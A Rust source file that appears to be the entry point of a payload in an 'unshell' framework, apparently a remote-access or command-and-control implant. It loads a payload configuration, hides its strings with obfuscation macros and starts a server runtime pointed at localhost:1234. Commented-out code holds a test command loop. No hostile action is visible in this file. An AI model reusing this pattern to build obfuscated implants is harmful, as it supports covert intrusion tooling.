use std::collections::HashMap;

use static_init::dynamic;
use unshell_lib::{
    config::{PayloadConfig, RuntimeConfig},
    module::Manager,
};
use unshell_obfuscate::{obs, symbol};

#[dynamic]
static PAYLOAD_CONFIG: PayloadConfig = PayloadConfig {
    id: symbol!("Test ID"),
    components: unshell_lib::get_components(),
    runtime_config: vec![],
};

use std::alloc::{Layout, alloc};
use std::ptr;

fn leak<T>(value: T) -> &'static mut T {
    unsafe {
        let layout = Layout::new::<T>();
        let ptr = alloc(layout) as *mut T;
        ptr::write(ptr, value);
        &mut *ptr
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    unshell_lib::logger::PrettyLogger::init();

    let manager = Manager::start(&PAYLOAD_CONFIG, Vec::new());

    let runtime = leak(RuntimeConfig {
        parent_component: symbol!("server").to_string(),
        name: symbol!("server runtime").to_string(),
        config: HashMap::from([(symbol!("host").to_string(), obs!("localhost:1234"))]),
    });

    Manager::start_runtime(manager.clone(), runtime);

    // Manager::st

    Manager::join(manager);

    // loop {
    //     print!("> ");
    //     stdout().flush().expect("Failed to flush stdout");
    //     let mut input = String::new();
    //     stdin().read_line(&mut input).expect("Failed to read line");

    //     let args = input.trim().split(" ").collect::<Vec<&str>>();

    //     match args[0] {
    //         "" => {}
    //         "test" => {
    //             if let Some(arg) = args.get(1) {
    //                 println!("Test with argument: {}", arg);
    //                 serverruntime
    //                     .send(&Announcement::TestAnnouncement(arg.to_string()))
    //                     .unwrap();
    //             } else {
    //                 println!("Test without argument");
    //             }
    //         }
    //         _ => {
    //             println!("Invalid Command: '{}'", args[0]);
    //         }
    //     }

    //     // println!("{:?}", args);
    // }

    // serverruntime.send(&Announcement::GetRuntimes)?;

    // let response = serverruntime.

    Ok(())
}
